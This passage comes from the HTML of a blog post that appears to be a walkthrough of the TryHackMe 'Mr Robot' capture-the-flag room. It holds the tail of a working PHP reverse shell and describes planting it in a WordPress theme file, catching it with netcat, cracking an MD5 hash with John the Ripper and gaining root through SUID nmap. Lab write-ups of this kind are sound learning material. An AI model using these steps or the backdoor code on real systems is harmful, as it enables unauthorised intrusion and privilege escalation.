</span></span><span class="line"><span class="ln">123</span><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">125</span><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">
</span></span><span class="line"><span class="ln">127</span><span class="cl"><span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">
</span></span><span class="line"><span class="ln">129</span><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl">	<span class="c1">// Check for end of TCP connection
</span></span></span><span class="line"><span class="ln">131</span><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell connection terminated&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">		<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">135</span><span class="cl">
</span></span><span class="line"><span class="ln">136</span><span class="cl">	<span class="c1">// Check for end of STDOUT
</span></span></span><span class="line"><span class="ln">137</span><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell process terminated&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">		<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">140</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">
</span></span><span class="line"><span class="ln">142</span><span class="cl">	<span class="c1">// Wait until a command is end down $sock, or some
</span></span></span><span class="line"><span class="ln">143</span><span class="cl"><span class="c1"></span>	<span class="c1">// command output is available on STDOUT or STDERR
</span></span></span><span class="line"><span class="ln">144</span><span class="cl"><span class="c1"></span>	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nx">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">
</span></span><span class="line"><span class="ln">147</span><span class="cl">	<span class="c1">// If we can read from the TCP socket, send
</span></span></span><span class="line"><span class="ln">148</span><span class="cl"><span class="c1"></span>	<span class="c1">// data to process&#39;s STDIN
</span></span></span><span class="line"><span class="ln">149</span><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">150</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK READ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">		<span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">154</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">
</span></span><span class="line"><span class="ln">156</span><span class="cl">	<span class="c1">// If we can read from the process&#39;s STDOUT
</span></span></span><span class="line"><span class="ln">157</span><span class="cl"><span class="c1"></span>	<span class="c1">// send data down tcp connection
</span></span></span><span class="line"><span class="ln">158</span><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT READ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl">		<span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">161</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl">
</span></span><span class="line"><span class="ln">165</span><span class="cl">	<span class="c1">// If we can read from the process&#39;s STDERR
</span></span></span><span class="line"><span class="ln">166</span><span class="cl"><span class="c1"></span>	<span class="c1">// send data down tcp connection
</span></span></span><span class="line"><span class="ln">167</span><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR READ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">		<span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">171</span><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">
</span></span><span class="line"><span class="ln">175</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">176</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">179</span><span class="cl"><span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">
</span></span><span class="line"><span class="ln">181</span><span class="cl"><span class="c1">// Like print, but does nothing if we&#39;ve daemonised ourself
</span></span></span><span class="line"><span class="ln">182</span><span class="cl"><span class="c1">// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
</span></span></span><span class="line"><span class="ln">183</span><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">185</span><span class="cl">		<span class="k">print</span> <span class="s2">&#34;</span><span class="si">$string\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">186</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">187</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl">
</span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>As an administrator we can do anything we want so let&rsquo;s edit the theme files, to our advantage, giving for example the <code>author-bio.php</code> file for our reverse shell, meaning that instead of displaying the biography of the author it will now run a reverse shell for us!</p>
<p><img src="/images/mrrobot4.png" alt="mrrobot4"></p>
<p>Before going to that specific page, we need to be listening in our host machine, listening meaning that we need to be ready for receiving the shell that our target is sending to us, that&rsquo;s why it&rsquo;s a reverse shell, now with netcat we can do:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">nc -lnvp <span class="m">443</span>
</span></span></code></pre></div><p>Their flags meaning:</p>
<ul>
<li><code>l</code>: Listen for inbound connections</li>
<li><code>n</code>: Numeric only IP addresses</li>
<li><code>v</code>: verbose</li>
<li><code>p</code>: Port specified</li>
</ul>
<p>In my case I&rsquo;m using the port 443, commonly known as the HTTPS port for listening, when we go to the specific page that would be in the themes directory since we modified the &ldquo;TwentyFifteen&rdquo; theme <code>/wp-content/themes/twentyfifteen/author-bio.php</code> we will get a blank screen, that&rsquo;s because no error happened, and we should get the shell back!</p>
<p><img src="/images/mrrobot5.png" alt="mrrobot5"></p>
<p>We are in their system! But there&rsquo;s still work left to do, since we are the &ldquo;daemon&rdquo; user, (daemon means process running in linux) we need to escalate our privilages, first, let&rsquo;s head home!</p>
<p><img src="/images/mrrobot7.png" alt="mrrobot6"></p>
<p>Being home we now know that we have another user in the system that is robot, and they have the second key that we need! But if we cat it out we will not have the permissions due to the fact we are not robot, but robot has a backup of his password hehehe, giving us access to change users, but is hashed! so we need to de-hash it first to get access to the password.</p>
<h3 id="john-the-ripper">John the ripper</h3>
<p>Let&rsquo;s rip that out! We are going to use John the ripper, that is a cracker, for this case to crack that cryptographic algorithm that is MD5 what it was used to hash the password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">john passmd5.hash --wordlist<span class="o">=</span>fsocity.dic --format<span class="o">=</span>Raw-MD5
</span></span></code></pre></div><p>Before running this command I have created a file called <code>passmd5.hash</code> where is the hash stored, and I have the <code>fsocity.dic</code> from the <code>robots.txt</code> giving us the password:
<img src="/images/mrrobot8.png" alt="mrrobot7"></p>
<p>Being the full alphabet! Now we can switch users! Let&rsquo;s use <code>su</code>
<img src="/images/mrrobot9.png" alt="mrrobot8"></p>
<p>But we get a problem, that is we are not running a fully interactive shell, so we need to upgrade our shell first, so we are going to do so by running a python one liner that spawns bash for us, then let&rsquo;s switch users!</p>
<p><img src="/images/mrrobot10.png" alt="mrrobot9"></p>
<p>We are now robot! With that said, we can now cat out the key, giving us the second flag.</p>
<h3 id="nmap-exploit">Nmap exploit</h3>
<p>let&rsquo;s get to know the system and know which programs does have root permissions:
<img src="/images/mrrobot6.png" alt="mrrobot10"></p>
<p>Being the command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">find / -user root -perm /4000 2&gt; /dev/null
</span></span></code></pre></div><p>Meaning, find all programs from the / directory with ownership of the user root, with the SUID of 4000 (can be used with root privilages without being root), and the errors throw them to nothingness (<code>/dev/null</code>)</p>
<p>And we find <code>nmap</code> in the list of programs that can run with root privilages without being root&hellip;</p>
<p>This leaves me thinking, should I use a NSE script for this? Better, let&rsquo;s GTFO of this restrictive shell with <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> !</p>
<p>That webpage is a repository full of unix functions that we can use to our advantage to escape restrictive shells and elevate our privilages &ldquo;exploiting&rdquo; bad configuration of permissions, etc&hellip;</p>
<p>For example, I&rsquo;m going to use the shell function to get a privilaged shell from nmap, using:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">nmap --interactive
</span></span><span class="line"><span class="ln">2</span><span class="cl">nmap&gt; !sh
</span></span></code></pre></div><p>Getting root privilages on the machine, now let&rsquo;s find the root flag that is not so hard to do:
<img src="/images/mrrobot11.png" alt="mrrobot11"></p>
<p>Finally getting the third and last flag, and completing the machine.</p>
<h2 id="outro">Outro</h2>
<p><img src="/images/mrrobot12.png" alt="mrrobot12"></p>
<p>Wow, I just loved this machine, for real wow this was really fun and challenging, this feels rewarding since I have just started to learn pentesting and to do all this by myself it&rsquo;s awesome, this machine was really fun and I learned a ton from this machine.</p>
<p>When completing this machine you earn this <a href="https://tryhackme.com/crazyc4t/badges/mr-robot">badge</a>.</p>
<p>Thanks all of you for reading my blog, I&rsquo;m really thankful and blessed for this, for you and for the great work we are putting into, I&rsquo;m preparing my first youtube &amp; odysee video soon! So tune up for that!</p>
 </content>
<p>
  
  <a class="blog-tags" href="http://localhost:1313/tags/try-hack-me/">#Try Hack Me</a>&nbsp;&nbsp;
  
  <a class="blog-tags" href="http://localhost:1313/tags/linux-priv-escalation/">#Linux Priv Escalation</a>&nbsp;&nbsp;
  
</p>

  </main>
  <footer><small>
  Made with ❤️ and <a href="https://gohugo.io/">Hugo</a>
  <p xmlns:cc="http://creativecommons.org/ns#">
    <a
      href="https://creativecommons.org/licenses/by-nc-sa/4.0/?ref=chooser-v1"
      target="_blank"
      rel="license noopener noreferrer"
      style="display: inline-block"
      ><img
        style="
          height: 22px !important;
          margin-left: 3px;
          vertical-align: text-bottom;
        "
        src="https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1"
        alt="" /><img
        style="
          height: 22px !important;
          margin-left: 3px;
          vertical-align: text-bottom;
        "
        src="https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1"
        alt="" /><img
        style="
          height: 22px !important;
          margin-left: 3px;
          vertical-align: text-bottom;
        "
        src="https://mirrors.creativecommons.org/presskit/icons/nc.svg?ref=chooser-v1"
        alt="" /><img
        style="
          height: 22px !important;
          margin-left: 3px;
          vertical-align: text-bottom;
        "
        src="https://mirrors.creativecommons.org/presskit/icons/sa.svg?ref=chooser-v1"
        alt=""
    /></a>
  </p>
</small>
</footer>

    
</body>

</html>
